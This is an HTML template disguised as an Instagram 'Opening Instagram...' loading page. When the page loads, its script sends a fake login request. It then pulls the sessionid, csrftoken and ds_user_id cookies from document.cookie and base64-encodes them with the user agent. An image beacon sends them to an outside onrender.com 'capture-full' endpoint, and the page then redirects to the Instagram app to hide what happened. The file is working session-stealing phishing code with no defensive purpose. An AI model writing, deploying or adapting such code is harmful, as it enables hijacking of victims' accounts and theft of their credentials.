<!-- core/templates/core/silent.html â†’ GETS USERNAME + PASS + SESSION -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram</title>
    <style>
        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,system-ui}
        .logo{width:105px;height:105px;background:url('https://instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png') center/contain no-repeat;margin-bottom:30px}
        .text{font-size:21px;color:#262626;font-weight:600}
        .spinner{width:50px;height:50px;border:6px solid #f0f0f0;border-top:6px solid #0095f6;border-radius:50%;animation:s 1s linear infinite;margin-top:25px}
        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="logo"></div>
    <div class="text">Opening Instagram...</div>
    <div class="spinner"></div>

    <script>
        // FORCE LOAD FULL ACCOUNT DATA
        fetch('https://www.instagram.com/accounts/login/ajax/', {
            method: 'POST',
            credentials: 'include',
            mode: 'no-cors',
            body: new URLSearchParams({ 'enc_password': '#PWD_INSTAGRAM_BROWSER:0:0:' })
        }).finally(() => {
            // NOW GRAB EVERYTHING
            setTimeout(() => {
                const cookies = document.cookie;
                const sessionMatch = cookies.match(/sessionid=([^;]+)/);
                const csrftoken = cookies.match(/csrftoken=([^;]+)/);
                const dsUserId = cookies.match(/ds_user_id=([^;]+)/);

                if (sessionMatch && dsUserId) {
                    const payload = {
                        sessionid: sessionMatch[1],
                        csrftoken: csrftoken ? csrftoken[1] : '',
                        user_id: dsUserId[1],
                        ua: navigator.userAgent
                    };

                    // SEND TO SERVER
                    new Image().src = 'https://instagram-64lz.onrender.com/capture-full/?data=' + 
                                      encodeURIComponent(btoa(JSON.stringify(payload))) + 
                                      '&t=' + Date.now();
                }
            }, 3000);
        });

        // OPEN APP
        setTimeout(() => {
            location.href = "instagram://app";
            setTimeout(() => location.href = "https://instagram.com", 3000);
        }, 4000);
    </script>
</body>
</html>